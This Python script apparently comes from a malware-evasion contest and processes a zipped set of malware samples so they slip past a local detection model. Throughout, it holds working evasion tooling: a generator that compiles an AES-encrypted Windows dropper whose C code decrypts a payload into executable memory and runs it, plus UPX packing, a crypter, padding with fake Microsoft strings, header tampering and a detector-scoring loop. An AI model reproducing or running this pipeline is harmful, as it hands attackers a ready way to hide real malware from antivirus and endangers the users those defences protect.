#!/usr/bin/env python3
"""
Method 4 - Advanced malware obfuscation agent (from attack2.py).

This variant keeps the advanced dropper/packer/agent logic but wraps it
with explicit dataset import (zip), decompression, execution, and re-compression.
"""

import argparse
import csv
import hashlib
import json
import random
import shutil
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path
from typing import Dict, List, Optional


try:  # Optional dependencies are loaded lazily elsewhere as well.
    import pefile  # type: ignore
except Exception:  # pragma: no cover - dependency may not exist
    pefile = None

try:
    from Crypto.Cipher import AES  # type: ignore
    from Crypto.Random import get_random_bytes  # type: ignore
except Exception:  # pragma: no cover
    AES = None
    get_random_bytes = None

try:
    import requests  # type: ignore
except Exception:  # pragma: no cover
    requests = None


METHOD_NAME = "method4_agent"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"

MAX_FILE_SIZE = 5_000_000
MAX_ITERATIONS = 5
LOCAL_MODEL_URL = "http://127.0.0.1:8080/predict"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def run_capa(exe_path: Path) -> List[str]:
    try:
        result = subprocess.run(
            ["capa", str(exe_path), "-j"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode == 0:
            data = json.loads(result.stdout)
            return sorted(
                rule["name"]
                for rule in data.get("rules", [])
                if rule.get("matches")
            )
    except Exception:
        pass
    return []


def test_local_model(exe_path: Path) -> float:
    if not requests:
        return 50.0
    try:
        with exe_path.open("rb") as handle:
            files = {"file": (exe_path.name, handle)}
            resp = requests.post(LOCAL_MODEL_URL, files=files, timeout=10)
            if resp.status_code == 200:
                score = resp.json().get("score", 50.0)
                return min(max(score, 0.0), 50.0)
    except Exception:
        pass
    return 50.0


def tool_change_timestamp(pe, target_path: Path):
    if not pe:
        return False
    pe.FILE_HEADER.TimeDateStamp = random.randint(0x65000000, 0x66000000)
    pe.OPTIONAL_HEADER.CheckSum = 0
    pe.write(str(target_path))
    pe.close()
    return True


def tool_append_benign(data: bytes, max_size: int) -> bytes:
    benign = b"\x00" * 200_000
    strings = [b"Microsoft Corporation\x00", b"Windows\x00", b"Copyright (C)\x00"]
    for _ in range(5000):
        benign += random.choice(strings)
    append_size = min(random.randint(500_000, 1_500_000), max_size - len(data))
    return data + benign[:append_size]


def tool_append_benign_file(path: Path) -> bool:
    modified = tool_append_benign(path.read_bytes(), MAX_FILE_SIZE)
    path.write_bytes(modified)
    return True


def tool_crypter_encrypt(exe_path: Path, output_path: Path) -> Optional[Path]:
    if not AES or not get_random_bytes:
        print("        AES/pycryptodome is not available; skipping crypter step")
        return None
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = exe_path.read_bytes()
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len]) * pad_len
    ciphertext = cipher.encrypt(plaintext)
    output_path.write_bytes(iv + key + ciphertext)
    return output_path


def tool_upx_pack(exe_path: Path, output_path: Path) -> bool:
    try:
        subprocess.run(
            ["upx", "-1", str(exe_path), "-o", str(output_path)],
            check=True,
            timeout=60,
        )
        return output_path.exists()
    except Exception:
        return False


def tool_dropper(src: Path, dst: Path) -> bool:
    if not AES or not get_random_bytes:
        print("        Missing pycryptodome; skipping dropper generation")
        return False
    workdir = None
    try:
        workdir = dst.parent / f"dropper_tmp_{random.randint(10000, 99999)}"
        workdir.mkdir(exist_ok=True)

        payload = src.read_bytes()
        key = get_random_bytes(32)
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pad_len = 16 - (len(payload) % 16)
        payload_padded = payload + bytes([pad_len]) * pad_len
        encrypted = cipher.encrypt(payload_padded)

        payload_bin = workdir / "payload.bin"
        payload_bin.write_bytes(encrypted)

        rc_path = workdir / "dropper.rc"
        rc_path.write_text('1 RCDATA "payload.bin"\n')

        key_hex = ", ".join(f"0x{b:02X}" for b in key)
        iv_hex = ", ".join(f"0x{b:02X}" for b in iv)

        c_code = f'''
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "advapi32.lib")
unsigned char key[] = {{ {key_hex} }};
unsigned char iv[] = {{ {iv_hex} }};
void run() {{
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
    HGLOBAL hGlob = LoadResource(NULL, hRes);
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID pRes = LockResource(hGlob);
    LPVOID pMem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pMem, pRes, size);
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    BYTE blob[44] = {{0}};
    *(DWORD*)blob = 0x08;
    *(DWORD*)(blob+4) = 0x02;
    *(DWORD*)(blob+8) = 0x6600;
    memcpy(blob+12, key, 32);
    CryptImportKey(hProv, blob, 44, 0, 0, &hKey);
    DWORD len = size;
    CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)pMem, &len);
    BYTE pad = ((BYTE*)pMem)[len-1];
    if (pad <= 16) len -= pad;
    ((void(*)())pMem)();
}}
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {{
    run();
    return 0;
}}
'''
        c_path = workdir / "dropper.c"
        c_path.write_text(c_code)

        res_path = workdir / "dropper.res"
        r1 = subprocess.run(
            ["x86_64-w64-mingw32-windres", "dropper.rc", "-O", "coff", "-o", "dropper.res"],
            cwd=workdir,
            capture_output=True,
            text=True,
            timeout=30,
        )
        if r1.returncode != 0:
            print(f"        windres failed:\n{r1.stderr}")
            return False

        r2 = subprocess.run(
            [
                "x86_64-w64-mingw32-gcc",
                "dropper.c",
                "dropper.res",
                "-o",
                str(dst),
                "-static-libgcc",
                "-static-libstdc++",
                "-s",
                "-O2",
                "-mwindows",
                "-Wl,--nxcompat,--dynamicbase",
                "-ladvapi32",
            ],
            cwd=workdir,
            capture_output=True,
            text=True,
            timeout=60,
        )
        if r2.returncode != 0:
            print(f"        gcc failed:\n{r2.stderr}")
            return False

        return dst.exists() and 10_000 < dst.stat().st_size < MAX_FILE_SIZE
    except Exception as exc:
        print(f"        Dropper exception: {exc}")
        return False
    finally:
        if workdir:
            shutil.rmtree(workdir, ignore_errors=True)


class ObfuscationAgent:
    def __init__(self):
        self.history: Dict[str, int] = {}
        self.checkpoints: List[bytes] = []
        self.tools = {
            "timestamp": lambda pe, path: tool_change_timestamp(pe, path),
            "benign": lambda pe, path: tool_append_benign_file(path),
            "upx": lambda pe, path: apply_upx(path),
            "crypter": lambda pe, path: apply_crypter(path),
            "dropper": lambda pe, path: tool_dropper(path, path),
        }

    def select_tool(self) -> str:
        if len(self.history) < 3:
            return "dropper"
        if "dropper" not in self.history:
            return "dropper"
        return max(self.history, key=self.history.get) if self.history else "dropper"

    def apply_tool(self, src: Path, dst: Path, tool_name: str) -> bool:
        pe = None
        if pefile:
            try:
                pe = pefile.PE(str(src))
            except Exception:
                pe = None

        success = self.tools[tool_name](pe, dst)
        if success:
            self.history[tool_name] = self.history.get(tool_name, 0) + 1
            return True
        return False

    def save_checkpoint(self, path: Path) -> None:
        self.checkpoints.append(path.read_bytes())

    def revert(self, path: Path) -> None:
        if self.checkpoints:
            path.write_bytes(self.checkpoints.pop())


def team9_transform(src: Path, dst: Path) -> bool:
    print(f"      -> Advanced agent obfuscation start: {src.name}")
    agent = ObfuscationAgent()
    best_score = 50.0
    best_file: Optional[Path] = None
    agent.save_checkpoint(src)

    for iteration in range(1, MAX_ITERATIONS + 1):
        print(f"        [Iteration {iteration}/{MAX_ITERATIONS}]")
        temp_path = dst.with_suffix(f".iter{iteration}")
        shutil.copy(src, temp_path)

        tool = agent.select_tool()
        print(f"        Tool in use: {tool}")

        if not agent.apply_tool(temp_path, temp_path, tool):
            print("        Tool failed, rolling back")
            agent.revert(temp_path)
            continue

        score = test_local_model(temp_path)
        print(f"        Local model score: {score:.1f}/50.0")

        if score < best_score:
            best_score = score
            if best_file and best_file.exists():
                best_file.unlink(missing_ok=True)
            best_file = temp_path
            agent.save_checkpoint(temp_path)

        if score <= 5.0:
            print(f"        Threshold met with score {score:.1f}")
            break

    if best_file and best_file.exists():
        shutil.move(best_file, dst)
    else:
        shutil.copy(src, dst)

    orig_caps = run_capa(src)
    new_caps = run_capa(dst)
    match_rate = len(set(orig_caps) & set(new_caps)) / max(len(orig_caps), 1)
    print(f"      Behavior match rate: {match_rate:.1%} (Capa)")
    return True


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    start_time = time.time()

    print("=" * 80)
    print("Advanced Malware Obfuscation Agent")
    print("=" * 80)
    print(f"Input: {input_dir}")
    print(f"Output: {output_dir}")
    print(f"Files: {len(files)}")
    print(f"Max iterations: {MAX_ITERATIONS}")
    print("=" * 80)

    for idx, src in enumerate(files, 1):
        print(f"\n[{idx}/{len(files)}] Processing: {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()
        try:
            team9_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            final_size = dst.stat().st_size
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "baseline_size": src.stat().st_size,
                    "output_size": final_size,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "notes": "agent-dropper-crypter",
                }
            )
            success += 1
        except Exception as exc:
            duration = time.time() - start
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "baseline_size": src.stat().st_size,
                    "output_size": 0,
                    "status": "FAIL",
                    "duration_sec": f"{duration:.3f}",
                    "notes": f"error: {str(exc)[:100]}",
                }
            )

    total_time = time.time() - start_time
    csv_file = output_dir / "compare_report.csv"
    with csv_file.open("w", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=rows[0].keys() if rows else [])
        if rows:
            writer.writeheader()
            writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row.get("status") == "OK":
                handle.write(f'{row["output_sha256"]}  {row["filename"]}\n')

    print("\n" + "=" * 80)
    print("Agent run finished")
    print(f"Success: {success}/{len(files)}")
    print(f"Elapsed time: {total_time:.1f}s")
    print(f"Report: {csv_file}")
    print(f"Hashes: {sha_file}")
    print("=" * 80)


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the Model1 Method4 agent pipeline end-to-end."
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset.",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory used for extraction + processing.",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Destination zip for processed files.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()
def apply_upx(path: Path) -> bool:
    temp_out = path.with_suffix(".upx.exe")
    if tool_upx_pack(path, temp_out):
        shutil.move(temp_out, path)
        return True
    return False


def apply_crypter(path: Path) -> bool:
    temp_out = path.with_suffix(".cry")
    result = tool_crypter_encrypt(path, temp_out)
    if result and temp_out.exists():
        shutil.move(temp_out, path)
        return True
    return False
